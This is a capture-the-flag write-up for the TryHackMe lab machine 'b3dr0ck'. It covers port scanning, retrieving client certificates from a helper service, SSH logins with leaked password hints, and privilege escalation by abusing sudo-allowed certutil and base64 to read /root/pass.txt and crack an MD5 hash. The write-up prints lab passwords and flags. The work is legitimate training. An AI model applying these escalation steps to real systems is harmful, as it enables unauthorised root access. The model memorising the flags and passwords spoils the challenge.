---
title: "b3dr0ck - 3 Boxes"
category: "crypto"
subcategory: "rsa"
type: "writeup"
tags: ["crypto", "rsa", "aes", "ecdsa", "side-channel", "privesc", "nmap", "ed25519", "base64", "base32", "nginx", "cgi"]
summary: "nmap -sC -sV 10.10.108.130 -oN init.nmap"
source:
  name: "Adamkadaban/CTFs"
  url: "https://github.com/Adamkadaban/CTFs/blob/ea683463e77d8867fb31dae4cb4fa6dd3da68852/3.Boxes/TryHackMe/b3dr0ck/README.md"
ctf:
  name: "3 Boxes"
  challenge: "b3dr0ck"
---

## Source

- **CTF:** 3 Boxes
- **Challenge:** b3dr0ck
- **Repository:** [Adamkadaban/CTFs](https://github.com/Adamkadaban/CTFs)
- **File:** <https://github.com/Adamkadaban/CTFs/blob/ea683463e77d8867fb31dae4cb4fa6dd3da68852/3.Boxes/TryHackMe/b3dr0ck/README.md>

---
### IP
`10.10.108.130`

# Recon
### nmap
`nmap -sC -sV 10.10.108.130 -oN init.nmap`
```
# Nmap 7.92 scan initiated Sat Aug 27 14:31:12 2022 as: nmap -sC -sV -oN init.nmap 10.10.108.130
Nmap scan report for 10.10.108.130
Host is up (0.13s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 1a:c7:00:71:b6:65:f5:82:d8:24:80:72:48:ad:99:6e (RSA)
|   256 3a:b5:25:2e:ea:2b:44:58:24:55:ef:82:ce:e0:ba:eb (ECDSA)
|_  256 cf:10:02:8e:96:d3:24:ad:ae:7d:d1:5a:0d:c4:86:ac (ED25519)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to https://10.10.108.130:4040/
|_http-server-header: nginx/1.18.0 (Ubuntu)
9009/tcp open  pichat?
| fingerprint-strings: 
|   NULL: 
|     ____ _____ 
|     \x20\x20 / / | | | | /\x20 | _ \x20/ ____|
|     \x20\x20 /\x20 / /__| | ___ ___ _ __ ___ ___ | |_ ___ / \x20 | |_) | | 
|     \x20/ / / _ \x20|/ __/ _ \| '_ ` _ \x20/ _ \x20| __/ _ \x20 / /\x20\x20| _ <| | 
|     \x20 /\x20 / __/ | (_| (_) | | | | | | __/ | || (_) | / ____ \| |_) | |____ 
|     ___|_|______/|_| |_| |_|___| _____/ /_/ _____/ _____|
|_    What are you looking for?
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9009-TCP:V=7.92%I=7%D=8/27%Time=630A62F9%P=x86_64-pc-linux-gnu%r(NU
SF:LL,29E,"\n\n\x20__\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20__\x20\x20_\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20____\x20\x20\x20_____\x20\
SF:n\x20\\\x20\\\x20\x20\x20\x20\x20\x20\x20\x20/\x20/\x20\|\x20\|\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\|\x20\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20/\\\x20\x20\x20\|\x20\x20_\x20\\\x20/\x20____\|\n\x20\x20\\\x
SF:20\\\x20\x20/\\\x20\x20/\x20/__\|\x20\|\x20___\x20___\x20\x20_\x20__\x2
SF:0___\x20\x20\x20___\x20\x20\|\x20\|_\x20___\x20\x20\x20\x20\x20\x20/\x2
SF:0\x20\\\x20\x20\|\x20\|_\)\x20\|\x20\|\x20\x20\x20\x20\x20\n\x20\x20\x2
SF:0\\\x20\\/\x20\x20\\/\x20/\x20_\x20\\\x20\|/\x20__/\x20_\x20\\\|\x20'_\
SF:x20`\x20_\x20\\\x20/\x20_\x20\\\x20\|\x20__/\x20_\x20\\\x20\x20\x20\x20
SF:/\x20/\\\x20\\\x20\|\x20\x20_\x20<\|\x20\|\x20\x20\x20\x20\x20\n\x20\x2
SF:0\x20\x20\\\x20\x20/\\\x20\x20/\x20\x20__/\x20\|\x20\(_\|\x20\(_\)\x20\
SF:|\x20\|\x20\|\x20\|\x20\|\x20\|\x20\x20__/\x20\|\x20\|\|\x20\(_\)\x20\|
SF:\x20\x20/\x20____\x20\\\|\x20\|_\)\x20\|\x20\|____\x20\n\x20\x20\x20\x2
SF:0\x20\\/\x20\x20\\/\x20\\___\|_\|\\___\\___/\|_\|\x20\|_\|\x20\|_\|\\__
SF:_\|\x20\x20\\__\\___/\x20\x20/_/\x20\x20\x20\x20\\_\\____/\x20\\_____\|
SF:\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\n\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\
SF:n\nWhat\x20are\x20you\x20looking\x20for\?\x20");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Aug 27 14:34:00 2022 -- 1 IP address (1 host up) scanned in 168.17 seconds
```
* Port 80 redirects to port 4040, as descriped in the challenge description.
* We know theres a simple tcp helper service listening for connections to retrieve the cert and key based on the chall description.
	* Port 9009 has a service running.

# Connecting
* We can connect to a service listening for connections with `nc 10.10.108.130`
	* Here, we see a prompt. We can input `key` and `cert` seperately to get the client key and certificate respectively:



barney.key
```
[REDACTED-PRIVATE-KEY-BLOCK]
```

barney.cert
```
-----BEGIN CERTIFICATE-----
MIICoTCCAYkCAgTSMA0GCSqGSIb3DQEBCwUAMBQxEjAQBgNVBAMMCWxvY2FsaG9z
dDAeFw0yMjA4MjcxODMwMTlaFw0yMzA4MjcxODMwMTlaMBgxFjAUBgNVBAMMDUJh
cm5leSBSdWJibGUwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDc0Fw/
oGEOQzkx4bYMP10EL4c6+282+Nx3STvjyNIY/L+G4IWBCkpVenzzCvNNfICTzK6T
570Z1p774yIdArACUk6ivOLLvVYAxAFojwERghLaxL63ACkMeOcSSeaYYhRT7HhC
OY8f4htFKPxAG1nDasFgvNdqq24xRwXKFJMuE+yhzqoLvdCKvEBGkyTFatob7Vra
s0KO2wV7X9zC0sEpKsG3oYP47OZGnmEBIZhb61LAJfwnEBNbjUjKL6DYt2eypUsv
5I9+9r9TI22i3sYgh78rl0tX5+PSzN4DMC+tYONhF0u2eaNhBzudtW6cKgtVFn5d
mF2FnLMUazmXTUI9AgMBAAEwDQYJKoZIhvcNAQELBQADggEBAHZKuGQoirmF0JVI
Temz0Ws5oXAxlwTb6AtR2LikAzq4NT5D8HmkssrIYVKyIEke4Dnjgm3BxL4YNnL1
FooHfHy9YSxbqyJJZ64gR0py+5A9JNOrcmtW5iSM0LvG8cj0Uh4pYG4zOjSX7I8R
fGZBrvj6AxTZ7TzvHO3OTAzXpf77oSMPm9lmyScB6wftXyirMcA1osfIgJaIma5x
YDVoAJBi0Yj+FJ3p39O1YRZhDrWjeKjjqjrLbdivjd1IFKOYRWE33GBeXWiXjbkv
u4R63S15djoh7frGYIMiOhhSYA1dTpBe+Bm2hT9oraf6MC4y/Wv4HYCkyw9j+RUz
fX1lAyY=
-----END CERTIFICATE-----
```

* Typing in `help` also shows how we can connect using the obtained information:
```bash
socat stdio ssl:MACHINE_IP:54321,cert=<CERT_FILE>,key=<KEY_FILE>,verify=0
```

We can connect:
```bash
socat stdio ssl:10.10.108.130:54321,cert=barney.cert,key=barney.key,verify=0
```
* This gives us a prompt for getting ssh login hints:
```
b3dr0ck> login
Login is disabled. Please use SSH instead.
b3dr0ck> password
Password hint: d1ad7c0a3805955a35eb260dab4180dd (user = 'Barney Rubble')
```

### ssh
* We can connect by first fixing the permissions on the key:
	* `chmod 600 barney.key`

* We can then connect with `ssh barney@10.10.108.130 -i barney.key` and using the password `d1ad7c0a3805955a35eb260dab4180dd`


* `cat ~/barney.txt` gives us the flag `THM{f05780f08f0eb1de65023069d0e4c90c}`


# Privesc
* We can run `sudo -l` and enter barney's password - `d1ad7c0a3805955a35eb260dab4180dd` to see sudo permissions:

```bash
Matching Defaults entries for barney on b3dr0ck:
    insults, env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User barney may run the following commands on b3dr0ck:
    (ALL : ALL) /usr/bin/certutil
```
* Barney can run `certutil` as root, meaning they can generate the ssh key and certificate for fred

### certutil
* `certutil` gives us the following usage:
```
Cert Tool Usage:
----------------

Show current certs:
  certutil ls

Generate new keypair:
  certutil [username] [fullname]
```

* We can type `certutil fred fred` and get the information we need:
```
Generated: clientKey for fred: /usr/share/abc/certs/fred.clientKey.pem
Generated: certificate for fred: /usr/share/abc/certs/fred.certificate.pem
[REDACTED-PRIVATE-KEY-BLOCK]
-----BEGIN CERTIFICATE-----
MIICmDCCAYACAjA5MA0GCSqGSIb3DQEBCwUAMBQxEjAQBgNVBAMMCWxvY2FsaG9z
dDAeFw0yMjA4MjgwMTM5MjhaFw0yMjA4MjkwMTM5MjhaMA8xDTALBgNVBAMMBGZy
ZWQwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDX6sha4EKBukeQFnO3
6aqr6dPlo+24FKYgr1mxegf+zIdZsLKfiXwHTYusr8BREPhP7qFewniVGu9gH7p2
gMftf3DCg6tF6XPj4iftvMl5T7KYaEiOJFCyQnG1Yvj6i0gbLPA6uqDr0Uw0YMwD
356M+VbZy5NezQz8i3fPhVkmKkvSgsK9EdbzfKy630pDp2RRURVwxLqn7bxp4U7l
HjE6qrkAvCr5C59DH3v7a5J18GhgNqKJAUmuuK07AnVE9PBBE7vcRkqJ0cEkpK9G
fyR6o2Dm8u+VEZO8LEBdicZVU7yYf+/D7D/u5XWcUZEwM0dJcqwp1r861QgzjKGa
dUMRAgMBAAEwDQYJKoZIhvcNAQELBQADggEBALs2Vhswpy6own474kn/xeDUGzo/
UMN31Ija1YFq6YuhQxkyd1DDq1z8Gnp8L58uPPYvutA4xqMPwr3rctftBd+8kW9e
a76yTBLl8OUDNhX4j8CHAMArcbXxHBpizAhSUDwHbU8+gDWYj3Jf6QmLay6M+6qF
/lx62PnKyGpfiPdkRf+drfGuw50F68Y9j82DowRhqEn/5eAAy/oJ/X14GW3LWshP
z0qiBZ8w8WKpZlYcjwD4eUY77IFwA6wbU5D5Z+4kH6Sz5REcLGekQMmQibDrkZLf
p+gW8ZouWKjS1i3G0mueBrekETx5TZ5jnwAlO2O3hUZqxOzk3+FaZZ/hZaE=
-----END CERTIFICATE-----
```

* Now we can do the same thing as before to get the password:
`socat stdio ssl:10.10.108.130:54321,cert=fred.cert,key=fred.key,verify=0`
```bash
Welcome: 'fred' is authorized.
b3dr0ck> help
Password hint: YabbaDabbaD0000! (user = 'fred')
```
* Fred's password is `YabbaDabbaD0000!`

### ssh
* Set the permissions of the key: `chmod 600 fred.key`
* We can now ssh in as fred with `ssh fred@10.10.108.130 -i fred.key` and by typing in his password (`YabbaDabbaD0000!`)

* `cat ~/fred.txt` gives us the flag: `THM{08da34e619da839b154521da7323559d}`


# Getting root
* Once again, we can run `sudo -l`:
```
Matching Defaults entries for fred on b3dr0ck:
    insults, env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User fred may run the following commands on b3dr0ck:
    (ALL : ALL) NOPASSWD: /usr/bin/base32 /root/pass.txt
    (ALL : ALL) NOPASSWD: /usr/bin/base64 /root/pass.txt
```
* Fred can run base64 on the `/root/pass.txt` file as root

* To get the contents of the file, we can run `sudo base64 /root/pass.txt | base64 -d`:
```
LFKEC52ZKRCXSWKXIZVU43KJGNMXURJSLFWVS52OPJAXUTLNJJVU2RCWNBGXURTLJZKFSSYK
```

* This doesn't work as a password, so we have to figure out what it is
	* I used [basecrack](https://github.com/mufeedvh/basecrack)
`basecrack -b LFKEC52ZKRCXSWKXIZVU43KJGNMXURJSLFWVS52OPJAXUTLNJJVU2RCWNBGXURTLJZKFSSYK -m`
```
[-] Encoded Base: LFKEC52ZKRCXSWKXIZVU43KJGNMXURJSLFWVS52OPJAXUTLNJJVU2RCWNBGXURTLJZKFSSYK

[-] Iteration: 1

[-] Heuristic Found Encoding To Be: Base32

[-] Decoding as Base32: YTAwYTEyYWFkNmI3YzE2YmYwNzAzMmJkMDVhMzFkNTYK

{{<<======================================================================>>}}

[-] Iteration: 2

[-] Heuristic Found Encoding To Be: Base64

[-] Decoding as Base64: a00a12aad6b7c16bf07032bd05a31d56

{{<<======================================================================>>}}

[-] Total Iterations: 2

[-] Encoding Pattern: Base32 -> Base64

[-] Magic Decode Finished With Result: a00a12aad6b7c16bf07032bd05a31d56
```

* The output looks like a hash, so we can try to identify it with a [hash identifier](https://www.tunnelsup.com/hash-analyzer/)
	* We get that it is md5

* We can crack it online using [crackstation](https://raw.githubusercontent.com/Adamkadaban/CTFs/ea683463e77d8867fb31dae4cb4fa6dd3da68852/3.Boxes/TryHackMe/b3dr0ck/crackstation.net)
	* The password is `flintstonesvitamins`

### ssh
* We can now `ssh 10.10.108.130` with the password `flintstonesvitamins` or simply `su root` with the same password in our existing ssh session
	* `cat ~/root.txt` gives us the flag: `THM{de4043c009214b56279982bf10a661b7}`
